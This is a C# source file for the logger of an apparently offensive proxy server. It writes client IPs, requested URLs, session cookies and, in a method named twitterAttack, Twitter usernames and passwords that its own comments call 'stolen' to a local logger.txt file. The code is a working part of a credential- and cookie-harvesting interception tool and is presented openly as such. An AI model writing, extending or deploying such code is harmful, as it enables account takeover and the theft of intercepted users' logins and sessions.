using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ProxyServer
{
    class Logger
    {
        StreamWriter sw;
        public Logger()
        {
            FileStream fs;
            if (File.Exists("logger.txt") == true)
            {
                fs = new FileStream("logger.txt", FileMode.Append);
            }
            else
            {
                fs = new FileStream("logger.txt", FileMode.Create);
            }
            sw = new StreamWriter(fs);

        }

        /// <summary>
        /// Update the logger when connecting to the server.
        /// </summary>
        /// <param name="url">The url the client requests.</param>
        /// <param name="ip">The IP of the client.</param>
        public void ConnectToServet(string url, string ip)
        {
            writeToLogger(DateTime.Now.ToString());
            writeToLogger("User IP: " + ip);
            writeToLogger("URL: " + url);
            writeToLogger("  -----   ");
        }

        /// <summary>
        /// Write a twitter attack details- username, password, ip, time.
        /// </summary>
        /// <param name="username">The username of the client that was stolen.</param>
        /// <param name="password">The password of the client that was stolen.</param>
        /// <param name="ip">The ip of the client that was stolen.</param>
        public void twitterAttack(string username, string password, string ip)
        {
            writeToLogger(DateTime.Now.ToString());
            writeToLogger("User IP: " + ip);
            writeToLogger("User name: " + username);
            writeToLogger("Password: " + password);
            writeToLogger("  -----   ");
        }

        /// <summary>
        /// Write cookies to the logger.
        /// </summary>
        /// <param name="url">The url of the request.</param>
        /// <param name="cookieData">The content of the cookie.</param>
        /// <param name="ip">The ip of the client.</param>
        public void writeCookies(string url, string cookieData, string ip)
        {
            writeToLogger(DateTime.Now.ToString());
            writeToLogger("User IP: " + ip);
            writeToLogger("URL: " + url);
            writeToLogger("Cookie: " + cookieData);
            writeToLogger("  -----   ");

        }

        /// <summary>
        /// Write the data string to the logger.txt file.
        /// </summary>
        /// <param name="data">data to write to the logger.</param>
        public void writeToLogger(string data)
        {
            sw.Flush();
            sw.WriteLine(data);
        }

    }
}
